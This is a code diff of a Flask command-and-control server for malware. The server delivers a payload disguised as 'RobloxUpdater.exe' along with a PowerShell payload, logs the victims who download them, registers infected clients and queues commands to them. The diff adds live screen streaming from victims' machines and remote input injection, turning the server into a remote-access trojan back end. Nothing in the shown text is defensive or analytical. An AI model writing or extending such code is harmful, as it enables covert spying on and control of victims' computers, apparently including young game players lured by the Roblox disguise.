@@ -6,9 +6,10 @@ app = Flask(__name__)
 PAYLOAD_EXE = "RobloxUpdater.exe"
 PAYLOAD_PS1 = "payload.ps1"
 
-# ---- in-memory store ----
 lock = threading.Lock()
-clients = {}   # cid -> {info, last_seen, queue: [], results: []}
+clients = {}
+screen_buffers = {}
+screen_lock = threading.Lock()
 
 def log_hit(ip, ua, endpoint):
     try:
@@ -18,7 +19,6 @@ def log_hit(ip, ua, endpoint):
         pass
     print(f"[+] {ip} -> {endpoint}")
 
-# ---- payload delivery ----
 @app.route("/payload")
 def payload():
     log_hit(request.remote_addr, request.headers.get("User-Agent",""), "/payload")
@@ -43,7 +43,6 @@ def raw_exe():
     log_hit(request.remote_addr, request.headers.get("User-Agent",""), "/raw_exe")
     return send_file(PAYLOAD_EXE, mimetype="application/octet-stream")
 
-# ---- C2 endpoints ----
 @app.route("/register", methods=["POST"])
 def register():
     data = request.get_json(silent=True) or {}
@@ -116,7 +115,6 @@ def list_clients():
                 "ip": c["ip"],
                 "uptime": int(now - c["first_seen"]),
                 "last_seen": int(now - c["last_seen"]),
-                "has_results": len(c["results"]) > 0,
             })
     return jsonify(out)
 
@@ -129,6 +127,37 @@ def get_results(cid):
         res = list(c["results"])
         c["results"] = []
     return jsonify({"results": res})
+
+@app.route("/screen_upload/<cid>", methods=["POST"])
+def screen_upload(cid):
+    data = request.get_data()
+    if not data:
+        return jsonify({"status": "empty"}), 400
+    with screen_lock:
+        screen_buffers[cid] = data
+    return jsonify({"status": "ok"})
+
+@app.route("/stream/<cid>")
+def stream(cid):
+    def gen():
+        while True:
+            with screen_lock:
+                frame = screen_buffers.get(cid)
+            if frame:
+                yield (b"--frame\r\n"
+                       b"Content-Type: image/jpeg\r\n\r\n" + frame + b"\r\n")
+            time.sleep(0.1)
+    return Response(gen(), mimetype="multipart/x-mixed-replace; boundary=frame")
+
+@app.route("/input/<cid>", methods=["POST"])
+def input_event(cid):
+    data = request.get_json(silent=True) or {}
+    with lock:
+        c = clients.get(cid)
+        if not c:
+            return jsonify({"status": "unknown"}), 404
+        c["queue"].append("__INPUT__" + json.dumps(data))
+    return jsonify({"status": "queued"})
 
 @app.route("/")
 def root():
